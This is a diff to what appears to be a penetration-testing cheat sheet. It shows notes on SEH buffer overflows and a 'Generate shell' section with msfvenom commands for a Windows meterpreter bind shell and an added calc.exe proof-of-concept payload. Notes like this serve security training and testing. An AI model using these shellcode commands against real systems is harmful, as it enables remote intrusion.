@@ -102,6 +102,7 @@
         !seh -- pop,pop,ret gadget -- For SEH BOF
     ##### 5.4.3 Generate shell
         msfvenom -p windows/meterpreter/bind_tcp RHOST=0.0.0.0 LPORT=4444 EXITFUNC=thread -a x86 --platform windows -b "\x00" -f python -v shellcode
+        msfvenom -p windows/exec cmd=calc.exe exitfunc=thread -b "\x00\x25\x26\x27\x2b" -f c
 
     
 ### 6.Post Exploitation
